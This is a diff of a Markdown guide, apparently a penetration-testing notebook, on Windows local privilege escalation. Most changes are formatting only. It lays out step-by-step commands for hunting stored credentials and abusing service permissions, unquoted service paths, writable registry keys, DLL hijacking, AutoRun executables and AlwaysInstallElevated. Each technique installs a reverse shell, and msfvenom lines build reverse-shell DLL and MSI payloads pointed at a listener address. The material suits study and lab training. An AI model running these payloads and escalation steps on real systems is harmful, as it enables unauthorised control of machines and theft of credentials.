@@ -8,7 +8,7 @@ Our ultimate goal is to escalate from a low privileged user to a user that runs 
 
 Enumerate the tools that are installed:
 
-```text
+```
 netsh /?
 icacls /?
 copy /?
@@ -24,7 +24,7 @@ powershell.exe -c ssh
 
 These are the directories that we usually have write access to:
 
-```text
+```
 C:\Users\Public
 C:\Users\your_user\
 C:\Users\your_user\AppData\Local\Temp
@@ -41,20 +41,20 @@ Consider a user account to be a collection of preferences and settings tied to a
 
 ### Service Accounts
 
-In Windows, service accounts are used to operate services. Service accounts aren't allowed to log into Windows. The **SYSTEM** account is the default service account in Windows, and it has the most rights of any local account. The **NETWORK SERVICE** and **LOCAL SERVICE** are two other default service accounts.
+In Windows, service accounts are used to operate services. Service accounts aren't allowed to log into Windows. The **SYSTEM **account is the default service account in Windows, and it has the most rights of any local account. The **NETWORK SERVICE** and **LOCAL SERVICE** are two other default service accounts.
 
 ### Groups
 
-Users can be members of numerous groups, and groups can have multiple members. Groups make it easy to govern who has access to what resources. 
+Users can be members of numerous groups, and groups can have multiple members. Groups make it easy to govern who has access to what resources.&#x20;
 
 Regular groups have a set of members, for example:
 
-* Administrators 
-* Users 
+* Administrators&#x20;
+* Users&#x20;
 
 Pseudo groups have a dynamic membership list that varies based on certain interactions, for example:
 
-*  Authenticated Users
+* &#x20;Authenticated Users
 
 ### Objects
 
@@ -75,7 +75,7 @@ These are the main objects of the Windows Operating System:
 
 #### **User object**
 
-A user object in AD represents a real user who is part of an organization’s AD network.  It is a leaf object, which means it can’t contain other AD objects within itself. The user may be an employee of the organization such as a manager, HR person, or an IT administrator who generally has elevated permissions over other users. A user object is a security principal, which means that it would have a security identifier \(SID\) apart from a global unique identifier \(GUID\). A user object in AD has attributes that contain information such as canonical names. first name, middle name, last name, login credentials telephone number, the manager who he or she reports to, address, who their subordinates are, and more.
+A user object in AD represents a real user who is part of an organization’s AD network.  It is a leaf object, which means it can’t contain other AD objects within itself. The user may be an employee of the organization such as a manager, HR person, or an IT administrator who generally has elevated permissions over other users. A user object is a security principal, which means that it would have a security identifier (SID) apart from a global unique identifier (GUID). A user object in AD has attributes that contain information such as canonical names. first name, middle name, last name, login credentials telephone number, the manager who he or she reports to, address, who their subordinates are, and more.
 
 #### **Contact object**
 
@@ -87,7 +87,7 @@ A printer object in AD is a pointer that points towards a real printer in the AD
 
 #### **Computer object**
 
-A computer object in AD represents a computer that is part of an organization’s AD network. The user may belong to any of the employees in the organization. It is a leaf object, which means it can’t contain other AD objects within itself. A computer object in AD is also a security principal, similar to the user object. So, computers also have SIDs apart from GUIDs. A computer object in AD has attributes that contain information such as computer name, computer name \(pre-Windows 2000\), its unique ID, DNS name, role, description, location, who the computer is managed by, the operating system version it is running on, and more.
+A computer object in AD represents a computer that is part of an organization’s AD network. The user may belong to any of the employees in the organization. It is a leaf object, which means it can’t contain other AD objects within itself. A computer object in AD is also a security principal, similar to the user object. So, computers also have SIDs apart from GUIDs. A computer object in AD has attributes that contain information such as computer name, computer name (pre-Windows 2000), its unique ID, DNS name, role, description, location, who the computer is managed by, the operating system version it is running on, and more.
 
 #### **Shared folder**
 
@@ -99,7 +99,7 @@ A group object in AD is an object that can contain other AD objects such as othe
 
 #### **Organizational Unit**
 
-An organizational unit \(OU\) in AD is an object that can contain other AD objects such as other groups, users, and computers, Hence, an OU is also a container object like groups. An OU in AD is a security principal too, similar to a user, computer, and group objects. So, OUs also have SIDs apart from GUIDs. An OU is used to delegate roles to member AD objects within the group. An OU in AD has attributes that contain information such as its name, member objects in the OU, and more.
+An organizational unit (OU) in AD is an object that can contain other AD objects such as other groups, users, and computers, Hence, an OU is also a container object like groups. An OU in AD is a security principal too, similar to a user, computer, and group objects. So, OUs also have SIDs apart from GUIDs. An OU is used to delegate roles to member AD objects within the group. An OU in AD has attributes that contain information such as its name, member objects in the OU, and more.
 
 #### **Domain**
 
@@ -107,7 +107,7 @@ A domain in AD is a structural component of the AD network. Domains contain AD o
 
 #### **Domain controller**
 
-A domain controller \(DC\) object in AD references a server that acts as a domain controller for the domain in which it is placed. The DC maintains the policies, authenticates AD users, and is also takes care of roles that all DCs in a domain should perform.
+A domain controller (DC) object in AD references a server that acts as a domain controller for the domain in which it is placed. The DC maintains the policies, authenticates AD users, and is also takes care of roles that all DCs in a domain should perform.
 
 #### **Site objects**
 
@@ -127,20 +127,20 @@ The text above was extracted from here:
 
 ### ACL / ACE
 
-In Windows, there are multiple objects: 
+In Windows, there are multiple objects:&#x20;
 
-* Files / Directories 
-* Registry Entries 
-* Services 
+* Files / Directories&#x20;
+* Registry Entries&#x20;
+* Services&#x20;
 * Others
 
-The access control list for a resource determines whether a user or group has permission to perform a specific action on it \(ACL\). The resource's access control list decides whether or not a person or group has authorization to perform a given action on it \(ACL\).
+The access control list for a resource determines whether a user or group has permission to perform a specific action on it (ACL). The resource's access control list decides whether or not a person or group has authorization to perform a given action on it (ACL).
 
-There are zero or more access control items in each ACL \(ACEs\). Each ACE establishes a link between a principal \(such as a user or a group\) and a specific access privilege.
+There are zero or more access control items in each ACL (ACEs). Each ACE establishes a link between a principal (such as a user or a group) and a specific access privilege.
 
 ### Integrity Levels
 
-All protected items from Windows Vista have an integrity level assigned to them. The default integrity label for most user and system files and registry keys on the system is "medium." The only exception is a set of particular directories and files that can be written to using Internet Explorer 7's Low Integrity mode. Most processes run by normal users \(even those initiated by a user in the administrators' group\) are labeled with medium integrity, while most services are labeled with System integrity. A high-integrity label protects the root directory. It's worth noting that a process with a lower integrity level can't write to a higher-integrity object.
+All protected items from Windows Vista have an integrity level assigned to them. The default integrity label for most user and system files and registry keys on the system is "medium." The only exception is a set of particular directories and files that can be written to using Internet Explorer 7's Low Integrity mode. Most processes run by normal users (even those initiated by a user in the administrators' group) are labeled with medium integrity, while most services are labeled with System integrity. A high-integrity label protects the root directory. It's worth noting that a process with a lower integrity level can't write to a higher-integrity object.
 
 Integrities:
 
@@ -157,7 +157,7 @@ You can enumerate your current integrity level using `whoami /groups`
 
 We can add a low privileged user to the Local Administrators group with the following command:
 
-```text
+```
 net localgroup administrators <username> /add
 ```
 
@@ -169,13 +169,13 @@ net localgroup administrators <username> /add
 
 Display Help:
 
-```text
+```
 windows-privesc-check2.exe -h
 ```
 
 Dump groups:
 
-```text
+```
 windows-privesc-check2.exe --dump -G
 ```
 
@@ -207,7 +207,7 @@ int main ()
 
 Compile the code with:
 
-```text
+```
 sudo i686-w64-mingw32-gcc filename.c -o filename.exe
 ```
 
@@ -217,7 +217,7 @@ sudo i686-w64-mingw32-gcc filename.c -o filename.exe
 
 Enumerate the Windows version and check if it has any known vulnerability:
 
-```text
+```
 # Old Commands
 systeminfo
 #Get only that information
@@ -260,7 +260,7 @@ Github repos of exploits:
 
 Any credential/Juicy info saved in the env variables?
 
-```text
+```
 set
 dir env:
 Get-ChildItem Env: | ft Key,Value
@@ -268,7 +268,7 @@ Get-ChildItem Env: | ft Key,Value
 
 ### PowerShell History
 
-```text
+```
 ConsoleHost_history #Find the PATH where is saved
 
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -280,7 +280,7 @@ cat (Get-PSReadlineOption).HistorySavePath | sls passw
 
 ### PowerShell Transcript files
 
-```text
+```
 #Check is enable in the registry
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
@@ -295,9 +295,9 @@ Stop-Transcript
 
 ### PowerShell Module Logging
 
-It keeps track of PowerShell's pipeline execution data. This includes all of the commands that are run, including command invocations and certain scripts. It is possible that it does not have all of the details of the execution and the output outcomes. You can activate this by selecting "Module Logging" instead of "Powershell Transcription" from the last section's link \(Transcript files\).
+It keeps track of PowerShell's pipeline execution data. This includes all of the commands that are run, including command invocations and certain scripts. It is possible that it does not have all of the details of the execution and the output outcomes. You can activate this by selecting "Module Logging" instead of "Powershell Transcription" from the last section's link (Transcript files).
 
-```text
+```
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
@@ -306,7 +306,7 @@ reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Module
 
 To view the last 20 events from PowerShell logs you can execute:
 
-```text
+```
 Get-WinEvent -LogName "windows Powershell" | select -First 20 | Out-GridView
 ```
 
@@ -314,31 +314,31 @@ Get-WinEvent -LogName "windows Powershell" | select -First 20 | Out-GridView
 
 It captures the entire action and substance of the script by recording blocks of code as they are executed. It keeps a complete audit record of all activities, which can be utilized in forensics and to investigate malicious behavior later. It keeps track of every activity at the time of execution and so offers complete information.
 
-```text
+```
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
 
-The Script Block logging events can be found in **Windows Event Viewer** under the following path: `Application and Sevices Logs > Microsoft > Windows > Powershell > Operational` 
+The Script Block logging events can be found in **Windows Event Viewer** under the following path: `Application and Sevices Logs > Microsoft > Windows > Powershell > Operational`&#x20;
 
 To view the last 20 events you can use:
 
-```text
+```
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
 ```
 
 ### Internet Settings
 
-```text
+```
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 ```
 
 ### Drives
 
-```text
+```
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
@@ -348,7 +348,7 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 We can enumerate unmounted file systems/volumes with:
 
-```text
+```
 mountvol
 mountvol [drive:]path VolumeName
 ```
@@ -357,50 +357,50 @@ mountvol [drive:]path VolumeName
 
 We can recursively enumerate files or directories permissions with:
 
-```text
+```
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 ```
 
 * Get-ACL = retrieve all permissions for a given file or directory
 * Get-ChildItem = enumerate everything under the specified argument
-* -Recurse = recursive search
+* \-Recurse = recursive search
 * AccessToString -match = properties specified
 
  Alternatively, we can use `accesschk.exe` from SysternalsSuite:
 
-```text
+```
 accesschk.exe -uws "Everyone" "C:\Program Files"
 ```
 
-* -u = suppress errors
-* -w = write access permissions
-* -s = recursive search
+* \-u = suppress errors
+* \-w = write access permissions
+* \-s = recursive search
 
  
 
 ## Drivers and Kernel Vulnerabilities
 
-Windows Exploit Suggester: 
+Windows Exploit Suggester:&#x20;
 
 {% embed url="https://github.com/bitsadmin/wesng" %}
 
-Precompiled Kernel Exploits: 
+Precompiled Kernel Exploits:&#x20;
 
 {% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}
 
-Watson: 
+Watson:&#x20;
 
 {% embed url="https://github.com/rasta-mouse/Watson" %}
 
 Enumerate the operating system with:
 
-```text
+```
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
 
 Enumerate drivers with `driverquery`:
 
-```text
+```
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 ```
 
@@ -409,7 +409,7 @@ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'St
 
 Enumerate drivers with `WmiObject`:
 
-```text
+```
 Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
 
@@ -423,7 +423,7 @@ Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, M
 
 If you are already running on a High Integrity process, the escalation to SYSTEM can be done by creating and executing a new service:
 
-```text
+```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
@@ -432,29 +432,29 @@ sc start newservicename
 
 ### Prerequisites
 
-Before considering that we can take some service to escalate our privileges, we must answer the questions below first: 
+Before considering that we can take some service to escalate our privileges, we must answer the questions below first:&#x20;
 
 * **Can we stop the service?**
 
-```text
+```
 net stop <service_name>
 ```
 
 * **Can we start the service?**
 
-```text
+```
 wmic service where caption="service_name" get name, caption, state, startmode
 ```
 
 * **Does the service requires a reboot, if so can we reboot the machine?**
 
-```text
+```
 whoami /priv
 ```
 
 * **Reboot a machine**
 
-```text
+```
 shutdown /r /t 0
 ```
 
@@ -467,7 +467,7 @@ shutdown /r /t 0
 
 We can use tasklist to enumerate running tasks:
 
-```text
+```
 tasklist /SVC
 ```
 
@@ -477,7 +477,7 @@ tasklist /SVC
 
 We can enumerate running services with:
 
-```text
+```
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
 ```
 
@@ -485,7 +485,7 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 
 We can also use `icacls` to enumerate permissions:
 
-```text
+```
 icacls "filename.exe"
 ```
 
@@ -501,25 +501,25 @@ Do BUILTIN\Users have F, M or R, or W?
 
 Query the configuration of a service:
 
-```text
+```
 > sc.exe qc <name>
 ```
 
 Query the current status of a service:
 
-```text
+```
 > sc.exe query <name>
 ```
 
 Modify a configuration option of a service:
 
-```text
+```
 > sc.exe config <name> <option>= <value>
 ```
 
 Start/Stop a service:
 
-```text
+```
 > net start/stop <name>
 ```
 
@@ -535,43 +535,39 @@ Services Permissions:
 
 If our user has the ability to change the configuration of a service that runs with SYSTEM privileges, we can replace the service's executable with one of our own. You might not be able to elevate privileges if you can change a service's settings but not stop/start it!
 
-#### Insecure Service Privilege Escalation 
+#### Insecure Service Privilege Escalation&#x20;
 
 Use winPEAS to check for service misconfigurations:
 
-```text
+```
 > .\winPEASany.exe quiet servicesinfo
 ```
 
-1. We can confirm this with accesschk.exe:
+1.  We can confirm this with accesschk.exe:
 
-   ```text
-   > .\accesschk.exe /accepteula -uwcqv user <service_name>
-   ```
+    ```
+    > .\accesschk.exe /accepteula -uwcqv user <service_name>
+    ```
+2.  Check the current configuration of the service:
 
-2. Check the current configuration of the service:
+    ```
+    > sc qc <service_name>
+    ```
+3.  Check the current status of the service:
 
-   ```text
-   > sc qc <service_name>
-   ```
+    ```
+    > sc query <service_name>
+    ```
+4.  Reconfigure the service binary path to use our reverse shell executable:
 
-3. Check the current status of the service:
+    ```
+    > sc config <service_name> binpath= "\"C:\Users\Public\reverse.exe\""
+    ```
+5.  Start a listener on Kali, and then start the service to trigger the exploit:
 
-   ```text
-   > sc query <service_name>
-   ```
-
-4. Reconfigure the service binary path to use our reverse shell executable:
-
-   ```text
-   > sc config <service_name> binpath= "\"C:\Users\Public\reverse.exe\""
-   ```
-
-5. Start a listener on Kali, and then start the service to trigger the exploit:
-
-   ```text
-   > net start <service_name>
-   ```
+    ```
+    > net start <service_name>
+    ```
 
 ### Unquoted Service Path
 
@@ -579,9 +575,9 @@ If the path to the service binary is not wrapped in quotes and there are spaces 
 
 > If you are using a long file name that contains a space, use quoted strings to indicate where the file name ends and the arguments begin; otherwise, the file name is ambiguous. For example, consider the string "c:\program files\sub dir\program name". This string can be interpreted in a number of ways. The system tries to interpret the possibilities in the following order:
 >
-> **c:\program.exe** 
+> **c:\program.exe**&#x20;
 >
-> **c:\program files\sub.exe** 
+> **c:\program files\sub.exe**&#x20;
 >
 > **c:\program files\sub dir\program.exe**
 >
@@ -595,53 +591,48 @@ More information here:
 
 #### Unquoted Service Path Privilege Escalation
 
-1. To check for service misconfigurations, run winPEAS:
+1.  To check for service misconfigurations, run winPEAS:
 
-   ```text
-   > .\winPEASany.exe quiet servicesinfo
-   ```
+    ```
+    > .\winPEASany.exe quiet servicesinfo
+    ```
+2.  Note an unquoted path that also contains spaces:
 
-2. Note an unquoted path that also contains spaces:
+    ```
+    C:\Program Files\Unquoted Path Service\Common Files\service_name.exe
+    ```
+3.  Perform a query to the service with sc to confirm this:
 
-   ```text
-   C:\Program Files\Unquoted Path Service\Common Files\service_name.exe
-   ```
+    ```
+    > sc qc <unquoted_service_name>
+    ```
+4.  To check for write rights, use accesschk.exe:
 
-3. Perform a query to the service with sc to confirm this:
+    ```
+    > .\accesschk.exe /accepteula -uwdq C:\
+    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+    > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+    ```
+5.  Copy the reverse shell executable and rename it appropriately:
 
-   ```text
-   > sc qc <unquoted_service_name>
-   ```
+    ```
+    > copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+    ```
+6.  Start a listener on our host (e.g Kali or Parrot), and then start the service to trigger the exploit:
 
-4. To check for write rights, use accesschk.exe:
-
-   ```text
-   > .\accesschk.exe /accepteula -uwdq C:\
-   > .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
-   > .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
-   ```
-
-5. Copy the reverse shell executable and rename it appropriately:
-
-   ```text
-   > copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
-   ```
-
-6. Start a listener on our host \(e.g Kali or Parrot\), and then start the service to trigger the exploit:
-
-   ```text
-   > net start <service_name>
-   ```
+    ```
+    > net start <service_name>
+    ```
 
 **Valid executable path Discovery:**
 
-```text
+```
 wmic service get displayname, pathname
 ```
 
 **Move the malicious executable:**
 
-```text
+```
 move filename.exe "c:\program files\service\filename.exe"
 ```
 
@@ -653,162 +644,145 @@ Each service has its own entry in the Windows registry. Because registry entries
 
 #### Weak Registry Permissions Privilege Escalation
 
-1. To check for service misconfigurations, run winPEAS:
+1.  To check for service misconfigurations, run winPEAS:
 
-   ```text
-   > .\winPEASany.exe quiet servicesinfo
-   ```
+    ```
+    > .\winPEASany.exe quiet servicesinfo
+    ```
+2.  Check if a service has a weak registry entry. We can confirm this with the Get-Acl cmdlet:
 
-2. Check if a service has a weak registry entry. We can confirm this with the Get-Acl cmdlet:
+    ```
+    PS> Get-Acl HKLM:\System\CurrentControlSet\Services\service_name | Format-List
+    ```
+3.  Alternatively, we can use accesschk.exe to confirm this:
 
-   ```text
-   PS> Get-Acl HKLM:\System\CurrentControlSet\Services\service_name | Format-List
-   ```
+    ```
+    > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\service_name
+    ```
+4.  Try to overwrite the ImagePath registry key to point to our reverse shell executable:
 
-3. Alternatively, we can use accesschk.exe to confirm this:
+    ```
+    > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\Public\reverse.exe /f
+    ```
+5.  Start a listener on our host (e.g Kali or Parrot), and then start the service to trigger the exploit:
 
-   ```text
-   > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\service_name
-   ```
-
-4. Try to overwrite the ImagePath registry key to point to our reverse shell executable:
-
-   ```text
-   > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\Public\reverse.exe /f
-   ```
-
-5. Start a listener on our host \(e.g Kali or Parrot\), and then start the service to trigger the exploit:
-
-   ```text
-   > net start regsvc
-   ```
+    ```
+    > net start regsvc
+    ```
 
 ### **Insecure Service Executables**
 
 If our user can modify the original service executable, we can easily replace it with our reverse shell executable. If you're going to use this in a real system, make a backup of the original executable.
 
-1. Enumerate services misconfiguration with winPEAS:
+1.  Enumerate services misconfiguration with winPEAS:
 
-   ```text
-   > .\winPEASany.exe quiet servicesinfo
-   ```
+    ```
+    > .\winPEASany.exe quiet servicesinfo
+    ```
+2.  If the service has an executable that appears to be writable by everyone.
 
-2. If the service has an executable that appears to be writable by everyone.
+    ```
+    > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\service_name.exe"
+    ```
+3.  Create a backup of the original service executable:
 
-   ```text
-   > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\service_name.exe"
-   ```
+    ```
+    > copy "C:\Program Files\File Permissions Service\service_name.exe" C:\Temp
+    ```
+4.  Copy the reverse shell executable to overwrite the service executable:
 
-3. Create a backup of the original service executable:
+    ```
+    > copy /Y C:\Users\Public\reverse.exe "C:\Program Files\File Permissions Service\service_name.exe"
+    ```
+5.  Start a listener on our host (e.g Kali or Parrot), and then start the service to trigger the exploit:
 
-   ```text
-   > copy "C:\Program Files\File Permissions Service\service_name.exe" C:\Temp
-   ```
-
-4. Copy the reverse shell executable to overwrite the service executable:
-
-   ```text
-   > copy /Y C:\Users\Public\reverse.exe "C:\Program Files\File Permissions Service\service_name.exe"
-   ```
-
-5. Start a listener on our host \(e.g Kali or Parrot\), and then start the service to trigger the exploit:
-
-   ```text
-   > net start filepermsvc
-   ```
+    ```
+    > net start filepermsvc
+    ```
 
 ### **DLL Hijacking**
 
-If a DLL is missing from the system and our user has to have write access to a directory within the PATH where Windows looks for DLLs, this is a more common misconfiguration that can be used to escalate privileges. 
+If a DLL is missing from the system and our user has to have write access to a directory within the PATH where Windows looks for DLLs, this is a more common misconfiguration that can be used to escalate privileges.&#x20;
 
 #### DLL Hijacking Privilege Escalation
 
-1. To enumerate non-Windows services, we can use winPEAS:
+1.  To enumerate non-Windows services, we can use winPEAS:
 
-   ```text
-   > .\winPEASany.exe quiet servicesinfo
-   ```
+    ```
+    > .\winPEASany.exe quiet servicesinfo
+    ```
+2.  Find a directory that is writable and in the PATH. Begin by enumerating which of these services our user has stop and start access to:
 
-2. Find a directory that is writable and in the PATH. Begin by enumerating which of these services our user has stop and start access to:
+    ```
+    > .\accesschk.exe /accepteula -uvqc user service_name
+    ```
+3.  If the service is vulnerable to DLL Hijacking.
 
-   ```text
-   > .\accesschk.exe /accepteula -uvqc user service_name
-   ```
+    ```
+    > sc qc service_name
+    ```
 
-3. If the service is vulnerable to DLL Hijacking.
+    > Note: Use ProcMon.exe to see if the executable uses any DLL files.
+4.  Start the service:
 
-   ```text
-   > sc qc service_name
-   ```
+    ```
+    > net start service_name
+    ```
+5.  On our host, we'll generate a reverse shell DLL named dll\_hijacking.dll:
 
-   > Note: Use ProcMon.exe to see if the executable uses any DLL files.
+    ```
+    # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o dll_hijacking.dll
+    ```
+6.  Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on our host (e.g Kali or Parrot) and then stop/start the service to trigger the exploit:
 
-4. Start the service:
-
-   ```text
-   > net start service_name
-   ```
-
-5. On our host, we'll generate a reverse shell DLL named dll\_hijacking.dll:
-
-   ```text
-   # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o dll_hijacking.dll
-   ```
-
-6. Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on our host \(e.g Kali or Parrot\) and then stop/start the service to trigger the exploit:
-
-   ```text
-   > net stop service_name
-   > net start service_name
-   ```
+    ```
+    > net stop service_name
+    > net start service_name
+    ```
 
 ## Registry
 
 ### AutoRuns
 
-When Windows starts up, it may be configured to perform commands with elevated privileges. These "AutoRuns" are set up via the Registry. If you can write to an AutoRun executable and restart the system, you might be able to elevate privileges \(or wait for it to restart\).
+When Windows starts up, it may be configured to perform commands with elevated privileges. These "AutoRuns" are set up via the Registry. If you can write to an AutoRun executable and restart the system, you might be able to elevate privileges (or wait for it to restart).
 
 #### AutoRuns Privilege Escalation Methodology
 
-1. Use winPEAS to check for writable AutoRun executables:
+1.  Use winPEAS to check for writable AutoRun executables:
 
-   ```text
-   .\winPEASany.exe quiet applicationsinfo
-   ```
+    ```
+    .\winPEASany.exe quiet applicationsinfo
+    ```
+2.  Alternatively, we could manually enumerate the AutoRun executables:
 
-2. Alternatively, we could manually enumerate the AutoRun executables:
+    ```
+    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    ```
 
-   ```text
-   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-   ```
+    and then use accesschk.exe to verify the permissions on each one:
 
-   and then use accesschk.exe to verify the permissions on each one:
+    ```
+    .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+    ```
+3.  The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
 
-   ```text
-   .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
-   ```
+    ```
+    copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+    ```
+4.  Copy our reverse shell executable to overwrite the AutoRun executable:
 
-3. The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
-
-   ```text
-   copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
-   ```
-
-4. Copy our reverse shell executable to overwrite the AutoRun executable:
-
-   ```text
-   copy /Y C:\Users\Public\reverse.exe "C:\Program Files\Autorun Program\program.exe"
-   ```
-
-5. Start a listener on your host, and then restart the target to trigger the exploit. 
+    ```
+    copy /Y C:\Users\Public\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+    ```
+5. Start a listener on your host, and then restart the target to trigger the exploit.&#x20;
 
 ### AlwaysInstallElevated
 
-MSI files are program installation package files. These files are installed with the permissions of the user who is attempting to install them. These installers can be launched with elevated \(i.e. admin\) capabilities in Windows. If this is the case, a malicious MSI file containing a reverse shell can be created.
+MSI files are program installation package files. These files are installed with the permissions of the user who is attempting to install them. These installers can be launched with elevated (i.e. admin) capabilities in Windows. If this is the case, a malicious MSI file containing a reverse shell can be created.
 
 The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine and the current user:
 
-```text
+```
 HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
 HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 ```
@@ -817,30 +791,27 @@ If either of these is missing or disabled, the exploit will **not** work.
 
 #### AlwaysInstallElevated Privilege Escalation Methodology
 
-1. Use winPEAS to see if both registry values are set:
+1.  Use winPEAS to see if both registry values are set:
 
-   ```text
-   .\winPEASany.exe quiet windowscreds
-   ```
+    ```
+    .\winPEASany.exe quiet windowscreds
+    ```
+2.  Alternatively, verify the values manually:
 
-2. Alternatively, verify the values manually:
+    ```
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    ```
+3.  Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
 
-   ```text
-   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-   ```
+    ```
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
+    ```
+4.  Copy the reverse.msi across to the Windows target, start a listener in your host, and run the installer to trigger the exploit:
 
-3. Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:
-
-   ```text
-   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi
-   ```
-
-4. Copy the reverse.msi across to the Windows target, start a listener in your host, and run the installer to trigger the exploit:
-
-   ```text
-   msiexec /quiet /qn /i C:\Users\Public\reverse.msi
-   ```
+    ```
+    msiexec /quiet /qn /i C:\Users\Public\reverse.msi
+    ```
 
 ## Passwords, Hashes, or Credentials
 
@@ -850,7 +821,7 @@ Sometimes administrators re-use passwords or leave them on computers in easily a
 
 This is a list of known files that contained passwords in clear-text or Base64:
 
-```text
+```
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
 web.config
@@ -924,7 +895,7 @@ TypedURLs       #IE
 
 ### AppCmd.exe
 
-### SCClient \| SCMM
+### SCClient | SCMM
 
 ### Browser History
 
@@ -934,11 +905,11 @@ TypedURLs       #IE
 
 ### Credentials in Recycle Bin
 
-###  Emails
+### &#x20;Emails
 
 #### Thunderbird
 
-```text
+```
 C:\Users\username\AppData\Roaming\Thunderbird\Profiles\hahaha.default-release\Mail\mail.sandbox.local\Inbox.
 ```
 
@@ -950,7 +921,7 @@ The Windows Registry is used by many apps to store configuration options. Passwo
 
 The commands below will look for entries and values in the registry that contain the word "password."
 
-```text
+```
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -959,28 +930,25 @@ Because this frequently yields a large number of results, it is often better to 
 
 #### Registry Passwords Privilege Escalation Methodology
 
-1. Use winPEAS to check common password locations:
+1.  Use winPEAS to check common password locations:
 
-   ```text
-   .\winPEASany.exe quiet filesinfo userinfo
-   ```
+    ```
+    .\winPEASany.exe quiet filesinfo userinfo
+    ```
+2.  The results show both AutoLogon credentials and Putty session credentials for the admin user&#x20;
 
-2. The results show both AutoLogon credentials and Putty session credentials for the admin user 
+    `(admin/r4nd0mp44ss)`.
+3.  We can verify these manually:
 
-   `(admin/r4nd0mp44ss)`.
+    ```
+    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
